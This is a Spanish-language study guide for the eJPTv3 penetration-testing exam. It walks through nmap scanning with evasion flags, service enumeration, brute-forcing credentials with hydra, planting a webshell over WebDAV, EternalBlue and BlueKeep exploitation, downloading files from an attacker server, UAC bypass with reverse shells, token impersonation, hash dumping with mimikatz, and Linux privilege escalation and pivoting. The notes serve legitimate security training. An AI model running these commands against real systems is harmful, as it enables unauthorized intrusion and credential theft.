---
title: "üìù eJPTv3 - Apuntes"
categories: [Certificaciones]
date: 2026-02-10 10:00:00 +0100
image: /assets/img/ejpt.png
description: "Resumen y apuntes para preparar la eJPTv3."
---

# üìù **eJPTv3 - Apuntes**

Apuntes para la eLearnSecurity Junior Penetration Tester (eJPT) v3

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/img/ejpt.png" width="300"/>
  <p style="font-style: italic; margin-top: 8px;">eJPT - ¬© eLearnSecurity | INE</p>
</div>

# **Reconocimiento**

El programa que usaremos por omisi√≥n para toda la fase de reconocimiento ser√° **`nmap`**

**1. DETECCI√ìN DE HOSTS (HOST DISCOVERY)**

- **`-sn`** : Solo detecta hosts activos (ping scan), sin escanear puertos.
- **`-Pn`** : Asume que el host est√° activo, omite ping. √ötil si ICMP est√° bloqueado.
- **`-PE`** : ICMP Echo Request (ping cl√°sico).
- **`-PP`** : ICMP Timestamp request (menos bloqueado que `-PE`).
- **`-PS[puertos]`** : TCP SYN ping.
- **`-PA[puertos]`** : TCP ACK ping.
- **`-PU[puertos]`** : UDP ping.
- **`-PR`** : ARP ping (solo funciona en redes locales). Muy fiable en LAN.

**2. ESCANEOS DE PUERTOS**

- **`-sS`** : SYN scan (r√°pido, sigiloso).
- **`-sT`** : TCP connect scan. Se usa si no tienes root.
- **`-sU`** : Escanea puertos UDP. M√°s lento, pero √∫til para DNS, SNMP, etc.
- **`-sN`**, **`-sF`**, **`-sX`** : Escaneos "invisibles" que env√≠an paquetes sin flags (NULL, FIN, Xmas). Usados para evadir firewalls.
- **`-p`** : Especifica puertos. Ej: `-p 80`, `-p 1-1000`, `-p U:53,T:22,80`.
- **`-p-`** : Escanea todos los puertos (1‚Äì65535).

**3. DETECCI√ìN DE SERVICIOS Y SISTEMAS**

- **`-sV`** : Detecta la versi√≥n del servicio en puertos abiertos.
- **`-A`** : Activaci√≥n completa: detecta OS (`-O`), versi√≥n (`-sV`), scripts (`-sC`).
- **`-O`** : Intenta detectar el sistema operativo.
- **`--osscan-guess`** : Fuerza conjeturas del sistema operativo si no puede identificarlo claramente.
- **`--traceroute`** : Incluye trazado de ruta al host.

**4. NSE: NMAP SCRIPTS**

- **`-sC`** : Usa scripts NSE por defecto.
- **`--script=nombre`** : Usa scripts espec√≠ficos. Ej: `--script=smb-enum-shares`.
- **`--script="grupo*"`** : Usa todos los scripts que coincidan. Ej: `--script="http*"` o `vuln`.
- **`--script-args`** : Pasa argumentos a scripts. Ej: `--script-args userdb=users.txt`.
- **Directorio de scripts NSE**:

**5. RENDIMIENTO Y VELOCIDAD**

- **`-T0`** a **`-T5`** : Controla la velocidad del escaneo, de menos a m√°s.
- **`--min-rate N`** : Fuerza m√≠nima de paquetes por segundo. Ej: `--min-rate 1000`.
- **`--max-retries N`** : Cu√°ntas veces reintentar un puerto que no responde.
- **`--host-timeout`** : Tiempo m√°ximo para escanear un host.
- **`--scan-delay`**  Retardo entre paquetes para evitar detecci√≥n.

**6. SALIDA**

- **`-oN`** : Salida normal en texto plano.
- **`-oG`** : Salida "grepable" (para procesamiento con scripts).
- **`-oX`** : Salida XML. √ötil para herramientas autom√°ticas.
- **`-oA`** : Genera todas las anteriores a la vez.
- **`-v`**, **`-vv`**, **`-vvv`** : Verbosidad (m√°s detalles en pantalla).
- **`--open`** : Muestra solo puertos abiertos. Muy √∫til.
- **`--reason`** : Muestra por qu√© Nmap cree que un puerto est√° abierto/cerrado.

**7. BYPASS / EVASI√ìN**

- **`-f`** : Fragmenta paquetes para evadir algunos firewalls.
- **`--data-length N`** : A√±ade relleno al paquete para confundir IDS/IPS.
- **`--source-port N`** : Usa un puerto fuente espec√≠fico.
- **`-D RND:10`** : Usa se√±uelos para ocultar tu IP real.
- **`--spoof-mac`** : Falsifica direcci√≥n MAC. Ej: `--spoof-mac 0` para aleatoria.

---

Los scripts predeterminados de Nmap se almacenan en la siguiente ubicaci√≥n:

    /usr/share/nmap/scripts/

---

Una vez explicadas todas las Flags, podemos establecer un par de comandos por defecto para realizar nuestro escaneo con la mayor precisi√≥n posible.

### üñ•Ô∏è 1. Descubrimiento de Hosts
```bash
sudo nmap -sn -PE -PS21,22,23,25,53,80,110,135,139,143,443,445,3389 -T4 -v {IP}
```
El motivo de este escaneo previo es detectar hosts, especialmente equipos Windows que bloquean las trazas ICMP. Para ello, intentamos identificar puertos activos y, en vez de hacer un **`ping`**, realizamos un **`TCP SYN`**.

### üîç 2. Descubrimiento de servicios
```bash
sudo nmap -sS -sV -sC -Pn -n -p- --min-rate 5000 -vvv {IP} -oN scan.txt
```
En el caso de que se quiera importar el escaneo al framework Metasploit, podemos a√±adir la flag **`-oX scan.xml`**.

# **Enumeraci√≥n**

## üö™ Puertos por Servicio

| Puerto(s) | Servicios                              | Protocolo  |
|-----------|----------------------------------------|------------|
| 21        | [FTP](#-ftp-puerto-21)                 | TCP        |
| 22        | [SSH](#-ssh-puerto-22)                 | TCP        |
| 25/465    | [SMTP/SMTPS](#Ô∏è-smtp-puertos-25465)    | TCP        |
| 80/443    | [HTTP/HTTPS](#-httphttps-puertos-80443)| TCP        |
| 445       | [SMB (445)](#-smb-puerto-445)          | TCP        |
| 161       | SNMP                                   | UDP        |
| 3306      | [MySQL](#Ô∏è-mysql-puerto-3306)          | TCP        |
| 3389      | [RDP](#Ô∏è-rdp-puerto-3389)              | TCP        |
| 5985/5986 | [WinRM (HTTP/HTTPS)](#Ô∏è-winrm-puertos-359855986)| TCP        |

### üìå **Notas:**
- **SMB**: En Linux se implementa con Samba.
- **WebDAV**: Suele estar en la ruta `/webdav/` y solo se puede encontrar en servicios `Microsoft IIS`.
- **SNMP**: Usa UDP exclusivamente.

## üîç Enumeraci√≥n por Servicio

### üìÅ **FTP (Puerto 21)**

**"File Transfer Protocol"**

Servicio para el intercambio de archivos en una estructura cliente-servidor.

**Procedimiento de enumeraci√≥n:**

Este servicio puede ser vulnerable al inicio de sesi√≥n de forma an√≥nima y, en caso de que sea as√≠, el escaneo con `nmap` ya nos lo habr√≠a reportado. No obstante, podemos comprobarlo con el siguiente script.
```bash
nmap -p 21 --script ftp-anon <IP>
```
`
### üîë **SSH (Puerto 22)**

**"Secure Shell"**

Servicio que permite la conexi√≥n remota mediante terminal a una m√°quina.

**Procedimiento de enumeraci√≥n:**

En el proceso de enumeraci√≥n no podemos hacer mucho con este servicio m√°s que ver si la versi√≥n encontrada es vulnerable a alguna vulnerabilidad de filtrado de usuarios:
```bash
nmap -p 22 -sV <IP> | grep -i "ssh"
```

### ‚úâÔ∏è **SMTP (Puertos 25/465)**

**"Simple Mail Transport Protocol"**

Servicio que permite el env√≠o de correos electr√≥nicos entre servidores o desde un cliente a un servidor remoto.

**Procedimiento de enumeraci√≥n:**

```bash
nmap --script smtp-enum-users <IP>
```

### üåê **HTTP/HTTPS (Puertos 80/443)**

**"Hyper Text Transfer Protocol (Secure)"**

Es el protocolo base de la web usado para transferir datos en una arquitectura cliente servidor.

**Procedimiento de enumeraci√≥n:**

Para poder enumerar m√∫ltiple informaci√≥n de un servicio web podemos usar diversos programas:
```bash
whatweb <IP>
```
Nos devuelve las principales tecnolog√≠as utilizadas en ese sitio web con sus versiones. Conviene enumerarlas y buscar en Internet posibles vulnerabilidades que las afecten.

A continuaci√≥n, es √∫til enumerar dominios, subdominios y archivos. Todo esto lo podemos realizar, por ejemplo, con la herramienta **`gobuster`**, pero tambi√©n se podr√≠a hacer con **`dirbuster`** o **`wfuzz`**.

#### **Enumeraci√≥n de directorios y archivos**

```bash
gobuster dir -u http://0.0.0.0 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50
```
**Flags**:

- **`dir`** : Para hacer fuzzing de directorios.
- **`-x`** : Para especificar que archivos queremos buscar.
- **`-t`** : Para el numero de hilos a usar.

#### **Enumeraci√≥n de subdominios**

```bash
gobuster vhost -u http://0.0.0.0 -w /usr/share/seclists/Discovery/DNS/* -t 50 --append-domain
```
**Flags**:

- **`vhost`** : Para hacer fuzzing de subdominios.
- **`--append-domain`** : Para especificar que tiene que poner los elementos de la lista al principio de la url.
- **`-t`** : Para el numero de hilos a usar.

### Microsoft IIS
**"Microsoft Internet Information Services"**

Es el servidor web desarrollado por Microsoft para hospedar p√°ginas web desarrolladas en ASP, .NET, PHP o HTML.
Lo √∫nico interesante de este servicio para posteriormente realizar una hipot√©tica explotaci√≥n, es comprobar si existe el servicio WebDAV instalado.
```bash
nmap --script --script http-enum <IP>
```
#### **WebDAV**

WebDAV es una extensi√≥n del protocolo HTTP que permite a los usuarios crear, mover, copiar y editar archivos en un servidor remoto como si fuera un disco local.

### üíª **SMB (Puerto 445)**
**"Server Message Block"** 

Protocolo para compartir archivos/impresoras en red (Samba en Linux).

**Procedimiento de enumeraci√≥n:**

Para enumerar informacion acerca del servicio SMB, podemos hacer uso de varias heramientas.
```bash
enum4linux -a <IP>
smbmap -H <IP>
nmap -p 445 --script smb-vuln-ms17-010 <IP> # Puede ser vulnerable a EternalBlue CVE-2017-0144
```

Generalmente se dar√° la situacion de tener que suministrar un usuario y una contrasena para poder obtener informacion del servicio.
```bash
smbmap -H <IP> -u <usuario> -p <contrase√±a>
smbclient -L //<IP> -U <usuario>%<contrase√±a>
```

### üóÑÔ∏è **MySQL (Puerto 3306)**

Sistema de gesti√≥n de bases de datos relacionales basado en consultas SQL.

**Procedimiento de enumeraci√≥n:**
```bash
nmap -p 3306 -sV --script mysql-info <IP>
```

### üóÑÔ∏è **RDP (Puerto 3389)**
**"Remote Desktop Protocol"** 

Servicio que permite a los usuarios conectarse remotamente a un equipo Windows mediante una interfaz gr√°fica.

**Procedimiento de enumeraci√≥n:**
```bash
nmap -p 3389 -sV <IP>
nmap -p 3389 --script rdp-vuln-ms12-020 <IP> -vv # Puede ser vulnerable a BlueKeep CVE-2019‚Äì0708
```

### ‚öôÔ∏è **WinRM (Puertos 35985/5986)**
**"Windows Remote Management"** 

Servicio que permite administrar equipos Windows de forma remota.

**Procedimiento de enumeraci√≥n:**
```bash
nmap -p 5985,5986 --script http-winrm-auth <IP>
```

# **Explotaci√≥n**

## üí• Explotaci√≥n por Servicio

### üìÅ **FTP (Puerto 21)**

**Procedimiento de explotaci√≥n:**

La explotaci√≥n de este servicio se realiza principalmente haciendo uso de fuerza bruta con herramientas como hydra, o con m√≥dulos de metasploit.
```bash
hydra -L /.../users.txt -P /usr/share/wordlists/rockyou.txt <IP> ftp -vV -t 4 -o credenciales.txt
```
**Flags**:

- **`-L`** : Para especificar la lista de usuarios.
- **`-P`** : Para especificar la lista de contrasenas.
- **`-l`** : Para especificar un usuario en concreto.
- **`-p`** : Para especificar una contrasena en concreto.
- **`-vV`** : Para mostrar mas informaci√≥n por pantalla.
- **`-t`** : Para especificar los hilos a usar.
- **`-s PORT`** : Si el servicio no usa el puerto por defecto.
- **`-o`** : 	Para guardar la credenciales exitosas en un fichero.

### üîë **SSH (Puerto 22)**

**Procedimiento de explotaci√≥n:**

La explotaci√≥n de este servicio se realiza principalmente haciendo uso de fuerza bruta con herramientas como hydra, o con m√≥dulos de metasploit.
```bash
hydra -L /.../users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP> -o credenciales.txt
```
**Flags**:

- **`-L`** : Para especificar la lista de usuarios.
- **`-P`** : Para especificar la lista de contrasenas.
- **`-l`** : Para especificar un usuario en concreto.
- **`-p`** : Para especificar una contrasena en concreto.
- **`-vV`** : Para mostrar mas informaci√≥n por pantalla.
- **`-t`** : Para especificar los hilos a usar.
- **`-s PORT`** : Si el servicio no usa el puerto por defecto.
- **`-o`** : 	Para guardar la credenciales exitosas en un fichero.

### üåê **HTTP/HTTPS (Puertos 80/443)**

**Procedimiento de explotaci√≥n:**

Para realizar una correcta explotaci√≥n de este protocolo, debemos distinguir los tres servicios que nos podemos encontrar: Apache, Apache Tomcat y Microsoft IIS con WebDAV habilitado.

### **Apache Web Server**

Puede ser vulnerable al ataque shellshock el cual puede producirse si existe algun tipo de archivo .cgi ejecutandose.
```bash
nmap <IP> --script http-shellshock --script-args "http-shellshock.uri=/FICHERO.cgi"
```
Conviene tambi√©n usar Burpsuite para tener m√°s control sobre el ataque y ver en qu√© campo podemos inyectar el c√≥digo.

### **Apache Tomcat**

Este servicio no suele ser muy vulnerable, pero la versi√≥n **`8.5.19`** es vulnerable a un RCE. Para explotarlo podemos hacer uso de metasploit con el m√≥dulo **`tomcat_jsp_upload_bypass`**.

### **WebDAV**

En caso de existir, para poder explotarlo necesitamos unas credenciales que podemos conseguir por ejemplo con hydra.
```bash
hydra -L /.../users.txt -P /usr/share/wordlists/rockyou.txt -s 80 <IP> http-get /webdav/ -o credenciales.txt
```
**Flags**:

- **`-L`** : Para especificar la lista de usuarios.
- **`-P`** : Para especificar la lista de contrasenas.
- **`-l`** : Para especificar un usuario en concreto.
- **`-p`** : Para especificar una contrasena en concreto.
- **`-s PORT`** : Si el servicio no usa el puerto por defecto.
- **`-o`** : 	Para guardar la credenciales exitosas en un fichero.

En caso de conseguir credenciales usaremos dos herramientas a continuaci√≥n. La primera **`Davtest`** para ver que archivos podemos subir y ejecutar y despu√©s **`Cadaver`** para subir la webshell.
```bash
davtest -auth name:password -url <url> -x
```
```bash
cadaver <url>/webdav/ 
  put /usr/share/webshells/asp/webshell.asp
```

### üíª **SMB (Puerto 445)**

**Procedimiento de explotaci√≥n:**

Este servicio puede ser vulnerable al exploit Eternalblue. En caso de haber identificado esta vulnerabilidad en la fase de escaneo, podemos usar un par de herramientas para explotarla. Podemos usar un script en python que podemos descargar de [GitHub](https://github.com/3ndG4me/AutoBlue-MS17-010), o en otro caso hacer uso del m√≥dulo de metasploit  **`ms17_010_eternalblue`** .


Tambi√©n podemos probar a realizar fuerza bruta de usuarios y contrase√±as con **`hydra`** para despu√©s usar **`smbclient`** y enumerar sus shares o usar **`psexec`** para intentar conseguir una terminal en la v√≠ctima.
```bash
hydra -L /.../users.txt -P /usr/share/wordlists/rockyou.txt smb://<IP> -vV -I -t 4 -o credenciales.txt
```
**Flags**:

- **`-L`** : Para especificar la lista de usuarios.
- **`-P`** : Para especificar la lista de contrasenas.
- **`-l`** : Para especificar un usuario en concreto.
- **`-p`** : Para especificar una contrasena en concreto.
- **`-s PORT`** : Si el servicio no usa el puerto por defecto.
- **`-t`** : Para especificar los hilos a usar.
- **`-vV`** : Para mostrar mas informacion por pantalla.
- **`-I`** : 	Ignora restauraciones de conexi√≥n.
- **`-o`** : 	Para guardar la credenciales exitosas en un fichero.

Si encontramos usuarios y contrase√±as, podemos usar smbclient para poder acceder a las shares.
```bash
smbclient -L //IP -U user # Muestra una lista de las shares
smbclient //IP/share ‚ÄìU <user>@<pass> # Te conecta mediante smb a la share
```
Y podemos probar a usar **`psexec`** para ver si somos capaces de conseguir una terminal en la v√≠ctima.

```bash
python3 psexec.py USER:PASSWORD@IP cmd.exe
```

### üóÑÔ∏è **RDP (Puerto 3389)**

**Procedimiento de explotaci√≥n:**

Este servicio puede ser vulnerable al exploit BlueKeep. En caso de haber identificado esta vulnerabilidad en la fase de escaeno, podemos usar un m√≥dulo de metasploit para explotarla.

    exploit/windows/rdp/cve_2019_0708_bluekeep_rce

Podemos usar tambi√©n **`hydra`** para intentar obtener alg√∫n usuario y contrase√±a para posteriormete conectarnos.
```bash
hydra -L /.../users.txt -P /usr/share/wordlists/rockyou.txt rdp://<IP> -s 3389 -vV -t 10 -o credenciales.txt
```
**Flags**:

- **`-L`** : Para especificar la lista de usuarios.
- **`-P`** : Para especificar la lista de contrasenas.
- **`-l`** : Para especificar un usuario en concreto.
- **`-p`** : Para especificar una contrasena en concreto.
- **`-s PORT`** : Si el servicio no usa el puerto por defecto.
- **`-t`** : Para especificar los hilos a usar.
- **`-vV`** : Para mostrar mas informaci√≥n por pantalla.
- **`-o`** : 	Para guardar la credenciales exitosas en un fichero.

### ‚öôÔ∏è **WinRM (Puertos 35985/5986)**

**Procedimiento de explotaci√≥n:**
La √∫nica manera de explotar este servicio es mediante el uso de fuerza bruta.
```bash
hydra -L /.../users.txt -P /usr/share/wordlists/rockyou.txt http-head://<IP>/wsman:5985 -s 5985 -vV -t 4 -o resultados_winrm.txt
```
**Flags**:

- **`-L`** : Para especificar la lista de usuarios.
- **`-P`** : Para especificar la lista de contrasenas.
- **`-l`** : Para especificar un usuario en concreto.
- **`-p`** : Para especificar una contrasena en concreto.
- **`-s PORT`** : Si el servicio no usa el puerto por defecto.
- **`-t`** : Para especificar los hilos a usar.
- **`-vV`** : Para mostrar mas informaci√≥n por pantalla.
- **`-o`** : 	Para guardar la credenciales exitosas en un fichero.

En el caso de que obtengamos credenciales v√°lidas, podemos hacer uso de herramientas como **`crackmapexec`** o **`evil-winrm`** para obtener una terminal en la v√≠ctima.
```bash
crackmapexec winrm <IP> -u USER -p PASSWORD
evil-winrm -i <IP> -u USER -p PASSWORD
```

# **Post Explotaci√≥n**

## **Windows**

Las fases esenciales del proceso de post explotaci√≥n son: [Enumeraci√≥n local](#enumeraci√≥n-local), [Transferir archivos](#transferir-archivos), [Escalada de privilegios](#escalada-de-privilegios), [Persistencia](#persistencia), dumpear y crackear hashes, pivotar y limpiar las marcas o trazas que hayamos dejado.

### **Enumeraci√≥n local**

**üìä Tabla de Comandos de Enumeraci√≥n Windows**

**üñ•Ô∏è Enumeraci√≥n del sistema**

**Meterpreter**

| Comando       | Descripci√≥n                                                         |
|---------------|---------------------------------------------------------------------|
| **`sysinfo`** | Muestra nombre del host, arquitectura, versi√≥n de Windows y dominio |

**Consola (CMD/PowerShell)**

| Comando     | Descripci√≥n                                                                                 |
|------------|----------------------------------------------------------------------------------------------|
| **`systeminfo`** | Muestra parches instalados, tiempo de actividad, configuraci√≥n de red y hotfixes       |
| **`wmic qfe get Caption,Description,HotFixId,InstalledOn`** | Lista actualizaciones instaladas con fechas |

**üë• Enumeraci√≥n de Usuarios y Grupos**

**Meterpreter**

| Comando                    | Descripci√≥n                                                     |
|----------------------------|-----------------------------------------------------------------|
| **`getuid`**               | Muestra el usuario actual de Meterpreter                        |
| **`getprivs`**             | Lista los privilegios del usuario actual (ej. SeDebugPrivilege) |
| **`enum_logged_on_users`** | Enumera usuarios actualmente logueados                          |

**Consola (CMD/PowerShell)**

| Comando                        | Descripci√≥n                                |
|--------------------------------|--------------------------------------------|
| **`query user`**               | Muestra usuarios conectados actualmente    |
| **`whoami /priv`**             | Lista privilegios del usuario actual       |
| **`net user`**                 | Lista todos los usuarios del sistema       |
| **`net user <nombre>`**        | Muestra detalles de un usuario espec√≠fico  |
| **`net localgroup`**           | Lista todos los grupos locales             |
| **`net localgroup <grupo>`**   | Muestra miembros de un grupo espec√≠fico    |

**üåê Enumeraci√≥n de Red**

**Meterpreter**

| Comando        | Descripci√≥n                         |
|----------------|-------------------------------------|
| **`ipconfig`** | Muestra configuraci√≥n b√°sica de red |

**Consola (CMD/PowerShell)**

| Comando            | Descripci√≥n                                          |
|--------------------|------------------------------------------------------|
| **`ipconfig /all`**| Muestra adaptadores, MAC, DHCP y DNS                 |
| **`arp -a`**       | Muestra la tabla ARP (dispositivos locales)          |
| **`netstat -ano`** | Lista puertos abiertos, IPs remotas y PIDs asociados |

**‚öôÔ∏è Enumeraci√≥n de Procesos y Servicios**

**Meterpreter**

| Comando                  | Descripci√≥n                              |
|--------------------------|------------------------------------------|
| **`ps`**                 | Lista procesos activos con PID y usuario |
| **`migrate <PID>`**      | Migra Meterpreter a otro proceso         |
| **`pgrep explorer.exe`** | Busca PID por nombre de proceso          |

**Consola (CMD/PowerShell)**

| Comando                        | Descripci√≥n                            |
|--------------------------------|----------------------------------------|
| **`net start`**                | Lista servicios en ejecuci√≥n           |
| **`tasklist /SVC`**            | Muestra procesos y servicios asociados |
| **`schtasks /query /fo LIST`** | Lista tareas programadas del sistema   |

### **üìÅ Transferir archivos**

Para transferir archivos desde tu m√°quina atacante a la m√°quina v√≠ctima que has comprometido, primero necesitas iniciar un servidor, generalmente con python, para poder servir los archivos y descargarlos desde la m√°quina v√≠ctima.

Servidor en python

```bash
python3 -m http.server 8000
```

Descarga desde la v√≠ctima

```bash
certutil -urlcache -split -f http://servidor/archivo.exe C:\ruta\local\archivo.exe
```

```bash
iwr http://servidor/archivo.exe -outfile archivo.exe
```

### **Escalada de privilegios**

La escalada de privilegios consiste en intentar obtener el m√°ximo privilegio dentro de un sistema. Existen varias maneras en las que podemos conseguir esto. La primera de ellas es usar el comando **`getsystem`** de **`meterpreter`** para que lo haga de forma autom√°tica. La segunda, es desactivar el [UAC (User Access Control)](#eludir-uac) mediante diversas t√©cnicas. Y por √∫ltimo haciendo [Token Impersonation](#token-impersonation). 
Conviene tambi√©n mirar si podemos migrar a un proceso que tenga m√°s privilegios de los que nosotros tenemos. Esto se puede intentar primero listando todos los procesos disponibles con **`ps`**, y despu√©s escribiendo **`migrate`** y el ID del proceso dentro de meterpreter.

#### **Eludir UAC**

"User Access Control" (UAC) es el mensaje emergente que aparece en Windows cuando instalas algo que va a realizar cambios en el sistema operativo y te pide confirmaci√≥n. Cabe destacar que esto ocurre cuando un usuario puede realizar cambios en el sistema operativo y, para que esto suceda, el usuario debe formar parte del grupo de administradores del sistema. Esto se puede comprobar usando el comando `net localgroup administrators` dentro del CMD.

Existen diversas maneras de evadir este control. La primera de ellas es mediante m√≥dulos de Metasploit como **`bypassuac_injection`**. Este m√≥dulo genera otra sesi√≥n de Meterpreter pero con el UAC desactivado, permitiendo ejecutar comandos con mayor libertad. No obstante, existen m√∫ltiples m√≥dulos m√°s que podr√≠an ser interesantes de revisar. Cuando usemos este tipo de m√≥dulos, debemos asegurarnos de que el payload y la m√°quina v√≠ctima sean de la misma arquitectura.

La segunda manera es usando la herramienta externa **UACme**, que se puede descargar de [GitHub](https://github.com/hfiref0x/UACME).

Una vez descargada, generamos un payload con **`msfvenom`** y lo subimos a la v√≠ctima. A continuaci√≥n, ejecutamos el comando `Akagi64.exe 23 payload.exe` y recibiremos la reverse shell en el multi/handler que hemos configurado previamente.

#### **Token impersonation**

El proceso encargado de gestionar la seguridad local en un sistema Windows es **`LSASS`** (Local Security Authority Subsystem Service). Cuando inicias el PC y escribes tu contrase√±a, se crea un token que te identifica. Sin embargo, existe una manera de suplantar estos tokens para hacerse pasar por un usuario diferente. El m√≥dulo que usaremos para esto es **`incognito`**, que se carga en Metasploit con el comando **`load`**. Este m√≥dulo tiene dos comandos importantes: el primero es **`list_tokens -u`**, que muestra todos los tokens disponibles para suplantar; una vez obtenida esta informaci√≥n, usamos el comando **`impersonate_token TOKEN`** para falsificar nuestros privilegios.
Cabe destacar que, una vez que hemos suplantado un token, puede que nuestro proceso siga asociado al token anterior, pero como tenemos un token v√°lido con m√°s privilegios, podemos migrar a otro proceso con m√°s privilegios sin problema.

### **Persistencia**

Para establecer persistencia en Windows, haremos uso de los **Windows Hashes**.

Los hashes se guardan en la base de datos SAM (Security Accounts Manager) y la verificaci√≥n y autenticaci√≥n la realiza LSA o LSASS. Actualmente, los hashes que se usan son los NTLM, que emplean el algoritmo MD4, pero tambi√©n se sigue generando el hash LM, que utiliza el algoritmo DES. Por lo tanto, es √∫til guardar ambos hashes, ya que en alg√∫n momento podr√≠amos necesitar los dos.
Puede ocurrir que se filtren contrase√±as en el archivo **`panther/unattend.xml`**. Si est√°n, estar√°n en base64, pero son f√°cilmente convertibles. Para obtener todo esto, necesitamos privilegios.

Por √∫ltimo, existe el comando de meterpreter **`hashdump`**, que puede devolvernos todos los hashes disponibles en caso de que contemos con los permisos m√°ximos.
Tambi√©n podemos usar Kiwi para dumpear los hashes que est√©n guardados en SAM. Para ello, cargamos el m√≥dulo con **`load kiwi`**. Cabe destacar que necesitamos privilegios de sistema para que el m√≥dulo funcione. Una vez que tenemos esto claro, podemos ejecutar el comando **`?`** para ver todas las opciones posibles, pero la m√°s interesante es **`lsa_dump_secrets`**, que nos vuelca toda la informaci√≥n de los registros LSA.

En su defecto, podemos hacer uso de la herramienta mimikatz, la cual podemos descargar desde [GitHub](https://github.com/gentilkiwi/mimikatz).

## **Linux**

En el caso de sistema Linux, lo pasos que explicaremos son [enumeraci√≥n local](#enumeraci√≥n-local-1), [transferir archivos](#transferir-archivos-1), [escalada de privilegios](#escalada-de-privilegios-1), y [pivoting](#pivoting).

### **Enumeraci√≥n Local**

**üìä Tabla de Comandos de Enumeraci√≥n Linux**

**üñ•Ô∏è Enumeraci√≥n del sistema**

**Meterpreter**

| Comando | Descripci√≥n |
|---------|-------------|
| **`sysinfo`** | Muestra:<br>‚Ä¢ Nombre del host<br>‚Ä¢ Kernel<br>‚Ä¢ Distribuci√≥n<br>‚Ä¢ Arquitectura |
| **`checkvm`** | Detecta si est√° en m√°quina virtual |
| **`enum_configs`** | Enumera archivos de configuraci√≥n interesantes |

**Shell**

| Comando | Descripci√≥n |
|---------|-------------|
| **`uname -a`** | Info del kernel y sistema |
| **`cat /etc/*-release`** | Versi√≥n de la distribuci√≥n |

**üë• Usuarios y Grupos**

**Meterpreter**

| Comando | Descripci√≥n |
|---------|-------------|
| **`getuid`** | Usuario actual |
| **`enum_users_history`** | Historial de comandos de usuarios |
| **`enum_sudo`** | Reglas sudo |

**Shell**

| Comando | Descripci√≥n |
|---------|-------------|
| **`id`** | Info del usuario actual |
| **`cat /etc/passwd`** | Todos los usuarios |
| **`cat /etc/shadow`** | Hashes de contrase√±as (necesita root) |
| **`sudo -l`** | Comandos permitidos con sudo |

**üåê Enumeraci√≥n de Red**

**Meterpreter**

| Comando | Descripci√≥n |
|---------|-------------|
| **`ifconfig`/`ipconfig`** | Configuraci√≥n de red |
| **`portfwd`** | Redirecci√≥n de puertos |

**Shell**

| Comando | Descripci√≥n |
|---------|-------------|
| **`ip a`** | Interfaces de red |
| **`arp -a`** | Tabla ARP |
| **`ss -tulnp`** / **`netstat -tulnp`** | Conexiones activas |
| **`cat /etc/resolv.conf`** | Configuraci√≥n DNS |

**‚öôÔ∏è Procesos y Servicios**

**Meterpreter**

| Comando | Descripci√≥n |
|---------|-------------|
| **`ps`** | Lista procesos |
| **`migrate <PID>`** | Migrar a proceso |

**Shell**

| Comando | Descripci√≥n |
|---------|-------------|
| **`ps aux`** | Procesos con detalles |
| **`crontab -l`** | Tareas cron del usuario |
| **`cat /etc/crontab`** | Tareas cron del sistema |

### **üìÅ Transferir archivos**

Para transferir archivos desde tu m√°quina atacante a la m√°quina v√≠ctima que has comprometido, primero necesitas iniciar un servidor, generalmente con python, para poder servir los archivos y descargarlos desde la m√°quina v√≠ctima.

Servidor en python

```bash
python3 -m http.server 8000
```

Descarga desde la v√≠ctima

```bash
wget https://servidor/archivo
```

```bash
curl -O https://servidor/archivo
```

### **Escalada de privilegios**

Para la escalada de privilegios en Linux, haremos uso de 3 t√©cnicas, mirar [privilegios sudo](#privilegios-sudo), [binarios SUID](#binarios-suid) y [Cron Jobs](#cron-jobs).

#### **Privilegios sudo**

Los privilegios sudo consisten en aquellos comandos espec√≠ficos que un usuario puede ejecutar con permisos sudo sin necesidad de ser root.

```bash
sudo -l
```

#### **Binarios SUID**

Un binario SUID es un archivo que, al ejecutarse, corre con los privilegios del due√±o del archivo (por ejemplo, root). Esto nos permite buscar archivos creados por root que podamos ejecutar, y as√≠ obtener permisos elevados. Una vez encontrado el archivo, podemos usar la funci√≥n `strings` para extraer cadenas legibles y analizar si el binario llama a otros ejecutables; si es as√≠, podr√≠amos modificar ese ejecutable para ejecutar c√≥digo arbitrario con privilegios root, como **`/bin/bash`**, obteniendo as√≠ una terminal con m√°ximos permisos.

No obstante, hay veces en que ciertos binarios ya tienen una forma r√°pida e inmediata de escalar privilegios. Por ello podemos buscar el nombre de los binarios SUID en [GTFOBins](https://gtfobins.github.io/) y si existen, mirar los pasos para poder explotarlos.

La manera de encontrar estos binarios es haciendo uso del comando

```bash
find / -perm -4000 -type f -user root 2>/dev/null
```

#### **Cron Jobs**

Un Cron Job es una tarea que se programa para ser ejecutada autom√°ticamente en intervalos de tiempo. Debido a que cada Cron Job es diferente entre s√≠ y est√°n creados a mano, la manera de explotarlos es list√°ndolos y analizando uno a uno si somos capaces de aprovecharnos de ellos para elevar nuestros privilegios.

```bash
crontab -l
```

```bash
ls -la /etc/cron*
```

### **Pivoting**

Una vez que hemos accedido a la m√°quina v√≠ctima, esta puede tener acceso a otras IPs a las que nosotros desde fuera no podemos acceder. Por ello conviene listar todas aquellas conexiones que esta m√°quina posee y despu√©s hacer portforwarding a nuestra m√°quina para poder acceder a ellas.

```bash
ss -tulnp
```
```bash
netstat -tulnp
```
En el caso de que hayamos encontrado algo interesante, podemos hacer uso de SSH para realizar el portforwarding de la siguiente manera:

Lo primero es generar en local un conjunto de claves p√∫blicas y privadas con el siguiente comando:

    ssh-keygen -t rsa -b 4096 -f NAME

A continuaci√≥n copiamos la clave p√∫blica (aquella que tiene extensi√≥n .pub) en el fichero authorized keys de la m√°quina que usaremos como intermediaria. Este fichero se suele encontrar bajo la ruta ~/.ssh.
Una vez que hemos copiado nuestra clave p√∫blica, volvemos a nuestra m√°quina y ejecutamos el siguiente comando.
ssh -i nombre_clave_privada -L LPORT:IP_PIVOTING:HPORT usuario@IP. Ejemplo:

    ssh -i artificial -L 9898:localhost:9898 gael@10.10.11.74

Una vez que todo esto ya est√° listo y no ha habido problemas, si nosotros ejecutamos cualquier comando y apuntamos a la direcci√≥n localhost:PORT, estaremos accediendo a la direcci√≥n IP que previamente no ten√≠amos acceso por el puerto PORT. 
